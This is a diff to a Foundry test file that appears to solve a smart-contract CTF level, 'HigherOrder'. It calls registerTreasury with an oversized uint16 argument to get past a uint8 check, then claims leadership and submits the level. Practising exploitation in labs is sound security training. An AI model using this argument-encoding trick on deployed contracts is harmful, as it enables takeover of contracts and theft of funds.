@@ -12,6 +12,12 @@ contract HigherOrderTest is Test {
   }
 
   function testExploit() public {
-    // ?
+    (bool success,) = challengeAddress.call(abi.encodeWithSignature("registerTreasury(uint8)", uint16(0x100)));
+    success;
+
+    (success,) = challengeAddress.call(abi.encodeWithSignature("claimLeadership()"));
+    success;
+
+    utils.submitLevelInstance(challengeAddress);
   }
 }
